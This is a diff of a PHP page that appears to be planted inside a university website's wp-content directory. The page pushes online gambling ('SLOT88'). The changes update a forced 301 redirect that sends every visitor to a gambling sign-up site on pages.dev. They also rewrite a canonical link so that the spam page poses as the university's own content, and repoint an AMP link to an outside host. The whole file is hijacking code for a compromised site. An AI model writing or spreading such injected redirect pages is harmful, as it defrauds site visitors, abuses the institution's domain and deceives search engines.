@@ -13,15 +13,13 @@ if (isset($_GET['page']) && !empty($_GET['page'])) {
     $page = 'SLOT88'; // Atau Anda bisa mengatur nilai default yang Anda inginkan
     $link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 }
-$ampnya = "https://bpkh-ulm-ranking-satu.pages.dev/wp-content/?page=" . strtolower($page);
+$ampnya = "https://bpkh-ulm-ranking-satu.pages.dev/wp-content/journal/?page=" . strtolower($page);
 
 ?>
-
 <?php
 //* Permanently redirect page
-header("Location: https://t.ly/pemburureferral",TRUE,301);
+header("Location: https://bbteam-daftar-paling-aman.pages.dev/",TRUE,301);
 ?>
-
 <!DOCTYPE HTML>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
 <head>
@@ -39,7 +37,7 @@ header("Location: https://t.ly/pemburureferral",TRUE,301);
   <meta name="og:image" content="https://iili.io/KFQ3yBV.png" />
   <link rel="manifest" href="https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json">
   <link rel="shortcut icon" href="https://i.postimg.cc/YCDqv6sG/seo-hantu.png" />
-  <link rel="canonical" href="https://bpkh.ulm.ac.id/wp-content/?page=<?= strtolower($page); ?>" />
+  <link rel="canonical" href="https://bpkh.ulm.ac.id/wp-content/journal/?page=<?= strtolower($page); ?>" />
   <link rel="amphtml"href=<?php echo $ampnya;?>>
   <!-- start preload -->
   <link rel="preload" href="https://iili.io/KFQ3yBV.png" as="image" />
